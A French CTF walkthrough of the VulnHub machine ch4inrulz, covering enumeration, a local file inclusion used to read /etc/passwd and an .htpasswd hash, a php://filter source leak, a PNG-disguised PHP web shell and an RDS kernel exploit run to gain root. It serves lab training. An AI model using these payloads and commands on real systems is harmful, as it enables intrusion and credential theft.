---
title: "Solution du CTF ch4inrulz de VulnHub"
tags: [CTF, VulnHub]
---

[ch4inrulz](https://vulnhub.com/entry/ch4inrulz-101,247/) était un CTF très proche de ce que j'ai vu sur le [billu b0x #1]({% link _posts/2023-05-14-Solution-du-CTF-billu-b0x-1-de-VulnHub.md %}) avec de l'exploitation web.

On peut sans doute bypasser une partie de la logique du CTF via quelques astuces de LFI, mais j'ai ici fait en sorte d'utiliser toute la logique du CTF.

## Leaking credz

```
Nmap scan report for 192.168.56.200
Host is up (0.00028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:5.9p1: 
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT*
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|_      CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.200:80/vendor/bootstrap/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/bootstrap/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/bootstrap/js/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/bootstrap/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.200:80/vendor/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.56.200:80/vendor/jquery/?C=N%3BO%3DD%27%20OR%20sqlspider
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /development/: Potentially interesting folder (401 Authorization Required)
|   /img/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.2.22: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
--- snip ---
|       CVE-2008-0455   4.3     https://vulners.com/cve/CVE-2008-0455
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2023-28625  0.0     https://vulners.com/cve/CVE-2023-28625
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-enum: 
|_  /api/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.2.22: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       SSV:60427       6.9     https://vulners.com/seebug/SSV:60427    *EXPLOIT*
--- snip ---
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2008-0455   4.3     https://vulners.com/cve/CVE-2008-0455
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2023-28625  0.0     https://vulners.com/cve/CVE-2023-28625
```

On peut lancer une énumération sur le port 80, mais on retrouve en partie la même chose que Nmap.

```
403       10l       30w      290c http://192.168.56.200/cgi-bin/
200       15l       68w     1111c http://192.168.56.200/js/
403       10l       30w      286c http://192.168.56.200/doc/
403       10l       30w      288c http://192.168.56.200/icons/
401       14l       56w      481c http://192.168.56.200/development/
200       15l       64w     1111c http://192.168.56.200/css/
200       19l      112w     1939c http://192.168.56.200/vendor/
200       14l       55w      908c http://192.168.56.200/img/
403       10l       30w      296c http://192.168.56.200/server-status/
```

Le dossier `development` demande des identifiants (code 401).

J'ai alors décidé de me pencher sur le port 8011. L'énumération remonte un dossier `api`.

```
200        8l       28w      351c http://192.168.56.200:8011/api/
403       10l       30w      290c http://192.168.56.200:8011/icons/
403       10l       30w      298c http://192.168.56.200:8011/server-status/
```

On tombe alors sur une page qui nous donne différents noms de fichiers :

```html
<title>FRANK's API | Under development</title>

<center><h2>This API will be used to communicate with Frank's server</h2></center>
<center><b>but it's still under development</b></center>
<center><p>* web_api.php</p></center>
<center><p>* records_api.php</p></center>
<center><p>* files_api.php</p></center>
<center><p>* database_api.php</p></center>
```

La plupart de ces fichiers n'existent pas, mais `files_api.php` donne un message :

```html
<p>No parameter called file passed to me</p><p>* Note : this API don't use json , so send the file name in raw format</p>
```

On parvient à lire un fichier en passant le paramètre `file` via `POST`.

```console
$ curl -X POST http://192.168.56.200:8011/api/files_api.php --data "file=/etc/passwd"

<head>
  <title>franks website | simple website browser API</title>
</head>

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
--- snip ---
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false
```

J'en ai profité pour aller lire le fichier `/var/www/development/.htaccess` dont la présence provoque le code 401 sur le port 80 :

```apache
AuthUserFile /etc/.htpasswd
AuthName "Frank Development Area"
AuthType Basic
AuthGroupFile /dev/null

<Limit GET POST>

require valid-user

</Limit>
```

Avec le path du `.htpasswd` je peux lire les identifiants attendus.

```
frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
```

Je casse le hash avec `JtR` et la wordlist `rockyou`, il s'agit du mot de passe  `frank!!!`.

## Uploadz

La page qui nous était auparavant bloquée contient le texte suivant :

> *** Here is my unfinished tools list**
> 
> #### - the uploader tool (finished but need security review)

Par logique je teste la présence d'un dossier `uploader` puis je trouve un fichier `upload.php` dont je tente de fuiter le code via la faille de directory traversal.

Le chemin du fichier est `/var/www/development/uploader/upload.php`.

Le code PHP semble interprété ce qui signifie que la faille est une LFI.

Pour obtenir le code PHP je fais précéder le path d'un filtre PHP pour encoder le contenu en base64 et ainsi empêcher l'interprétation :

`php://filter/convert.base64-encode/resource=/var/www/development/uploader/upload.php`

Je peux alors décoder le base64 et obtenir le code source :

```php
<?php
$target_dir = "FRANKuploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded to my uploads path.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?>
```

Comme sur le CTF *billy b0x* je vais uploader une image contenant du code PHP puis je l'inclurais via la LFI.

```bash
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.png
```

Mon shell récupère son paramètre via GET :

```console
$ curl -X POST "http://192.168.56.200:8011/api/files_api.php?cmd=id" --data "file=/var/www/development/uploader/FRANKuploads/shell.png" -o-

<head>
  <title>franks website | simple website browser API</title>
</head>

�PNG
▒
IHDRuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le répertoire courant est `/var/anotherwww/api` et non `/var/www/development/uploader/`.

## Kernelz

La première chose qui saute aux yeux en fouillant dans le système, c'est que l'auteur du CTF a dû faire un `chown -R frank:frank /var`.

Pour autant je ne vois pas en quoi ça peut être exploitable.

`LinPEAS` remonte quelques exploits kernel pour le système :

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: highly probable
   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [N/A] caps_to_root 2

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},[ ubuntu=10.10|9.10 ],fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```

On voit aussi via `lastlog` un utilisateur nommé `firefart` qui n'existe plus sur le système :

```
╔══════════╣ Last logons
firefart pts/0        192.168.209.131  Sat Apr 14 07:32 - down   (00:00)    
frank    tty1                          Sat Apr 14 07:31 - down   (00:01)    
frank    tty1                          Sat Apr 14 07:31 - 07:31  (00:00)    
reboot   system boot  2.6.35-19-generi Sat Apr 14 07:30 - 07:33  (00:02)    
frank    pts/0        192.168.209.1    Fri Apr 13 16:14 - down   (15:15)    
frank    tty1                          Fri Apr 13 16:07 - down   (15:22)    
frank    tty1                          Fri Apr 13 16:07 - 16:07  (00:00)    
reboot   system boot  2.6.35-19-generi Fri Apr 13 16:07 - 07:30  (15:23)
```

Les habitués auront reconnu cet utilisateur comme étant créé par un exploit pour la faille `DirtyCOW`. C'est vraisemblablement l'escalade de privilèges attendue.

Par esprit de contradiction je me suis tourné vers l'exploit *RDS* :

```console
www-data@ubuntu:/tmp$ gcc -o rds linux-rds-exploit.c 
www-data@ubuntu:/tmp$ ./rds 
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xffffffffa01b18c0
 [+] Resolved rds_ioctl to 0xffffffffa01aa000
 [+] Resolved commit_creds to 0xffffffff810852b0
 [+] Resolved prepare_kernel_cred to 0xffffffff81085780
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
8f420533b79076cc99e9f95a1a4e5568
```
